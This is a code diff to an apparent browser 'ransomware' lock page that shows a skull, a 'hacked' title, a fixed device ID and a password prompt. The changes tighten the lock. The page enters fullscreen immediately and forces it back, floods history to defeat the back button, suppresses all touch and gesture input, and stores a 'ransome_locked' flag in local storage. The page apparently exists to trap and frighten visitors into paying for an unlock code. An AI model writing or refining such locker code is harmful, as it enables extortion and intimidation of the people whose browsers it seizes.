@@ -46,8 +46,8 @@
         }
 
         .skull {
-            font-size: 100px;
-            margin-bottom: 15px;
+            font-size: 90px;
+            margin-bottom: 10px;
             filter: drop-shadow(0 0 20px red);
             animation: shake 0.5s infinite;
         }
@@ -59,11 +59,11 @@
         }
 
         .hacked-title {
-            font-size: 38px;
+            font-size: 36px;
             font-weight: bold;
             color: #ff0000;
             letter-spacing: 5px;
-            margin-bottom: 8px;
+            margin-bottom: 5px;
             text-shadow: 0 0 10px red;
             animation: blink 1s infinite;
         }
@@ -76,7 +76,7 @@
         .sub-text {
             font-size: 14px;
             color: #ff6666;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .message-box {
@@ -85,7 +85,7 @@
             border-radius: 20px;
             padding: 20px;
             width: 90%;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .warning-text {
@@ -107,7 +107,7 @@
         }
 
         .device-id-value {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             font-family: monospace;
             color: #ff6666;
@@ -125,6 +125,7 @@
             cursor: pointer;
             margin: 10px 0;
             box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            transition: 0.1s;
         }
 
         .unlock-btn:active {
@@ -132,7 +133,7 @@
         }
 
         .exit-warning {
-            margin-top: 20px;
+            margin-top: 15px;
             font-size: 11px;
             color: #ff6666;
             opacity: 0.6;
@@ -220,11 +221,6 @@
             display: none;
             white-space: nowrap;
         }
-
-        /* Hide all possible overlays */
-        iframe, object, embed {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
@@ -272,18 +268,24 @@
         // Fixed Device ID
         document.getElementById('deviceId').innerText = 'THARE-80892';
 
-        // ========== FULLSCREEN & HIDE EVERYTHING ==========
+        // ========== FULLSCREEN - NO DOUBLE TAP ==========
         function enterFullscreen() {
             const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-            
-            // Also try to hide status bar
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+            // Hide status bar
             window.scrollTo(0, 1);
         }
 
-        // Force fullscreen always
+        // Call immediately - no double tap needed
+        enterFullscreen();
+
+        // Force stay in fullscreen
         document.addEventListener('fullscreenchange', function() {
             if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                 setTimeout(() => enterFullscreen(), 50);
@@ -296,7 +298,7 @@
             }
         });
 
-        // ========== BLOCK EVERYTHING ==========
+        // ========== BLOCK EVERYTHING - NO SLIDES ==========
         function blockEverything() {
             // Block back button - push infinite history
             for(let i = 0; i < 100; i++) {
@@ -324,13 +326,15 @@
                 return false;
             });
 
-            // Block ALL touch events
+            // Block ALL touch events (slides, swipes)
             document.addEventListener('touchstart', function(e) {
                 e.preventDefault();
-            });
+            }, { passive: false });
+            
             document.addEventListener('touchmove', function(e) {
                 e.preventDefault();
-            });
+            }, { passive: false });
+            
             document.addEventListener('touchend', function(e) {
                 e.preventDefault();
             });
@@ -365,13 +369,13 @@
             document.addEventListener('gestureend', function(e) { e.preventDefault(); });
         }
 
-        // ========== PASSWORD MODAL (Only working thing) ==========
+        // ========== PASSWORD MODAL ==========
         function showPasswordModal() {
             document.getElementById('passwordModal').style.display = 'flex';
             document.getElementById('unlockPassword').value = '';
             document.getElementById('passError').style.display = 'none';
             
-            // Temporarily allow typing in password field
+            // Allow typing in password field
             const passInput = document.getElementById('unlockPassword');
             passInput.addEventListener('touchstart', function(e) {
                 e.stopPropagation();
@@ -407,27 +411,14 @@
             }, 500);
         }
 
-        // ========== SAVE STATE FOR RESTART ==========
+        // ========== SAVE LOCK STATE ==========
         function saveLockState() {
             localStorage.setItem('ransome_locked', 'true');
-            localStorage.setItem('ransome_device_id', 'THARE-80892');
-        }
-
-        function checkLockState() {
-            const isLocked = localStorage.getItem('ransome_locked');
-            if (isLocked === 'true') {
-                // Still locked, show lock screen
-                document.getElementById('lockScreen').style.display = 'flex';
-                blockEverything();
-                enterFullscreen();
-            }
         }
 
         // ========== INIT ==========
         function init() {
             saveLockState();
-            checkLockState();
-            enterFullscreen();
             blockEverything();
             
             // Continuously push history
